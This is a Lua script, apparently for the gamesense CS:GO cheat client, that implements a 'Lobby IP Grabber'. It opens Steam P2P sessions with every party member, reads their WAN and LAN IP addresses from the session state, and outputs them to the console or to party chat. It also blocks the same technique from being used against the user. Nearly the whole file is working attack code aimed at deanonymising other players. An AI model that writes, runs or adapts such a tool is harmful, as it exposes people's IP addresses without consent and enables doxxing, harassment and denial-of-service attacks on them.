local steamworks = require "gamesense/steamworks"
local ISteamNetworking = steamworks.ISteamNetworking

local js = panorama.open()
local _ = js['$']
local MyPersonaAPI = js.MyPersonaAPI
local PartyListAPI = js.PartyListAPI
local GameStateAPI = js.GameStateAPI
local LobbyAPI = js.LobbyAPI

local EP2PSessionError = steamworks.EP2PSessionError
local EP2PSend = steamworks.EP2PSend

local Targets = {}
local Names = {} -- Cringe, but lazy
local IPs = {}

local StartGrab, sendPartyMSG, intToIp, disableGrabber

-- UI Code
local grabberEnable = ui.new_checkbox('MISC', 'Miscellaneous', 'Lobby IP Grabber')
local grabberOutput = ui.new_combobox('MISC', 'Miscellaneous', 'Output', {'Party Chat', 'Console'})
ui.set(grabberOutput, 'Console')
local grabberMask = ui.new_checkbox('MISC', 'Miscellaneous', 'Mask IPs')
local grabberStart = ui.new_button('MISC', 'Miscellaneous', 'Grab', function() StartGrab() end)

ui.set_visible(grabberOutput, false)
ui.set_visible(grabberMask, false)
ui.set_visible(grabberStart, false)

ui.set_callback(grabberEnable, function(item)
	local Status = ui.get(item)
	ui.set_visible(grabberOutput, Status)
	ui.set_visible(grabberMask, Status)
	ui.set_visible(grabberStart, Status)
end)

local function Output(...)
	local Method = ui.get(grabberOutput)
	local Data = table.pack(...)
	local Msg = table.concat(Data, ' ')
	
	if Method == 'Console' then
		print(Msg)
	elseif Method == 'Party Chat' then
		sendPartyMSG(Msg)
	end
end

steamworks.set_callback("P2PSessionRequest_t", function(request)
	-- ISteamNetworking.CloseP2PSessionWithUser(request.m_steamIDRemote)

	local success, result = ISteamNetworking.GetP2PSessionState(request.m_steamIDRemote)
	
	local name = PartyListAPI.GetFriendName(tostring(request.m_steamIDRemote))

	print('[POTENTIAL GRABBER] ', name, ' (', request.m_steamIDRemote, ') might be trying to steal your ip!')

	local Times = 10
	local Interval = 10
	for i=1, Times do
		client.delay_call(Times == 1 and 0 or ( ( i - 1 ) * Interval ) / 1000, function()
			_.DispatchEvent( 'PlaySoundEffect', 'container_weapon_ticker', 'MOUSE')
		end)
	end
end)

-- steamworks.set_callback("P2PSessionConnectFail_t", function(request)
-- 	print('WHAT THE FUCK RICHARD! ')
-- 	local reason = tostring(EP2PSessionError[request.m_eP2PSessionError])
-- 	print('reason: ', reason)
-- 	print('m_steamIDRemote: ', request.m_steamIDRemote)
-- 	print(tostring(request.m_steamIDRemote) == request.m_steamIDRemote)
-- 	print('iptable: ', IPs[request.m_steamIDRemote])
-- 	print('number of IP', IPs[request.m_steamIDRemote] and #IPs[tostring(request.m_steamIDRemote)])
-- 	if reason == 'Timeout' and IPs[request.m_steamIDRemote] and #IPs[request.m_steamIDRemote] == 0 then
-- 		local steamid = tostring(request.m_steamIDRemote)
-- 		local name = PartyListAPI.GetFriendName(steamid)

--     	Output(name, ' (', steamid, ') seems to be blocking us.')
-- 	end
-- end)

StartGrab = function()
	Targets = {}
	Names = {}
	IPs = {}

	disableGrabber = true

	for index=0, PartyListAPI.GetCount()-1 do
		local SteamXUID = PartyListAPI.GetXuidByIndex(index)
		if SteamXUID:len() > 7 and SteamXUID ~= MyPersonaAPI.GetXuid() then
			local target = steamworks.SteamID(SteamXUID)
				
			Targets[#Targets + 1] = target
			Names[target] = PartyListAPI.GetFriendName(SteamXUID)
			ISteamNetworking.SendP2PPacket(target, "asdf", 4, EP2PSend.UnreliableNoDelay, 0)
		end
	end

	Output('[[ IP GRABBER ]]')
	Output('# Added ' .. #Targets .. ' to queue!')
	Output('# Waiting 5 secs...')
	
	client.delay_call(5, function()
		disableGrabber = false
		
		local Method = ui.get(grabberOutput)
		local WAN = ( Method == 'Party Chat' and '\u{1d5ea}\u{1d5d4}\u{1d5e1}' or 'WAN' ) .. ': '
		local LAN = ( Method == 'Party Chat' and '\u{1d5df}\u{1d5d4}\u{1d5e1}' or 'LAN' ) .. ': '

		for target, ips in pairs(IPs) do
			local IPStr = ''
			for index, ip in ipairs(ips) do
				local LanOrWan = #ips == 1 and WAN or ( index == 1 and LAN or WAN )
				IPStr = IPStr .. LanOrWan .. intToIp(ip, ui.get(grabberMask)) .. ( #ips == 1 and '' or  ( index == 1 and ' | ' or '' ) )
			end
			local width, height = renderer.measure_text(nil, Names[target])
			Output(string.sub(Names[target], 1, 25) .. ':',  IPStr)
		end
	end)
end
 -- Saph, I'm only adding this to protect one real life friend of mine, I have no intention of flooding this or selling this, just one person who has 3 accs.
local Whitelist = {
	['76561198108791626'] = true,
	['76561198148192561'] = true,
	['76561198861797912'] = true,
}

local function IPUpdate()
	for index, target in ipairs(Targets) do
		local success, result = ISteamNetworking.GetP2PSessionState(target)
		if result.m_nRemoteIP ~= 0 then
			IPs[target] = IPs[target] or {}
			local Exists = false
			for index, IP in ipairs(IPs[target]) do
				if IP == result.m_nRemoteIP then
					Exists = true
				end
			end
			if not Exists then
				if ( not Whitelist[tostring(target)] ) then
					table.insert(IPs[target], result.m_nRemoteIP)
				end
			end
		end
	end
	client.delay_call(0.25, IPUpdate)
end
IPUpdate()

local function BlockLoop()
	if LobbyAPI.IsSessionActive() and not disableGrabber then
        for index=0, PartyListAPI.GetCount()-1 do
            local SteamXUID = PartyListAPI.GetXuidByIndex(index)
            if SteamXUID:len() > 7 and SteamXUID ~= MyPersonaAPI.GetXuid() then
                local target = steamworks.SteamID(SteamXUID)
                ISteamNetworking.CloseP2PSessionWithUser(target)
            end
        end
    end
    client.delay_call(0.01, BlockLoop)
end
BlockLoop()

sendPartyMSG = function(msg)
	PartyListAPI.SessionCommand('Game::Chat', string.format('run all xuid %s chat %s', MyPersonaAPI.GetXuid(), msg:gsub(' ', ' ')))
end

intToIp = function(n, mask)
    n = tonumber(n)
    local n1 = math.floor(n / (2^24)) 
    local n2 = math.floor((n - n1*(2^24)) / (2^16))
    local n3 = math.floor((n - n1*(2^24) - n2*(2^16)) / (2^8))
    local n4 = math.floor((n - n1*(2^24) - n2*(2^16) - n3*(2^8)))
	if mask then
		return n1.."."..n2..'.xxx.xxx'
	end
    return n1.."."..n2..'.'..n3.."."..n4
end